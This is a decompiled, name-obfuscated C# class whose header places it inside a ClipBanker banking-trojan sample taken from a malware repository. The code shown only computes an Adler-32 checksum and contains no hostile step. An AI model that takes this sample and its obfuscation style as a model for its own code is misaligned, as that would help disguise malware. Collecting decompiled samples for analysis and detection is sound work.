// Decompiled with JetBrains decompiler
// Type: A5m.232
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using System.Runtime.InteropServices;

namespace A5m
{
  internal sealed class \u003232
  {
    private static readonly uint Wyu = 65521;
    private static readonly int \u003677 = 5552;

    public static uint \u0033bv([In] uint obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      if (obj1 == null)
        return 1;
      uint num1 = obj0 & (uint) ushort.MaxValue;
      uint num2 = obj0 >> 16 & (uint) ushort.MaxValue;
      while (obj3 > 0)
      {
        int num3 = obj3 < \u003232.\u003677 ? obj3 : \u003232.\u003677;
        obj3 -= num3;
        for (; num3 >= 16; num3 -= 16)
        {
          uint num4 = num1 + (uint) obj1[obj2++];
          uint num5 = num2 + num4;
          uint num6 = num4 + (uint) obj1[obj2++];
          uint num7 = num5 + num6;
          uint num8 = num6 + (uint) obj1[obj2++];
          uint num9 = num7 + num8;
          uint num10 = num8 + (uint) obj1[obj2++];
          uint num11 = num9 + num10;
          uint num12 = num10 + (uint) obj1[obj2++];
          uint num13 = num11 + num12;
          uint num14 = num12 + (uint) obj1[obj2++];
          uint num15 = num13 + num14;
          uint num16 = num14 + (uint) obj1[obj2++];
          uint num17 = num15 + num16;
          uint num18 = num16 + (uint) obj1[obj2++];
          uint num19 = num17 + num18;
          uint num20 = num18 + (uint) obj1[obj2++];
          uint num21 = num19 + num20;
          uint num22 = num20 + (uint) obj1[obj2++];
          uint num23 = num21 + num22;
          uint num24 = num22 + (uint) obj1[obj2++];
          uint num25 = num23 + num24;
          uint num26 = num24 + (uint) obj1[obj2++];
          uint num27 = num25 + num26;
          uint num28 = num26 + (uint) obj1[obj2++];
          uint num29 = num27 + num28;
          uint num30 = num28 + (uint) obj1[obj2++];
          uint num31 = num29 + num30;
          uint num32 = num30 + (uint) obj1[obj2++];
          uint num33 = num31 + num32;
          num1 = num32 + (uint) obj1[obj2++];
          num2 = num33 + num1;
        }
        if (num3 != 0)
        {
          do
          {
            num1 += (uint) obj1[obj2++];
            num2 += num1;
          }
          while (--num3 != 0);
        }
        num1 %= \u003232.Wyu;
        num2 %= \u003232.Wyu;
      }
      return num2 << 16 | num1;
    }
  }
}
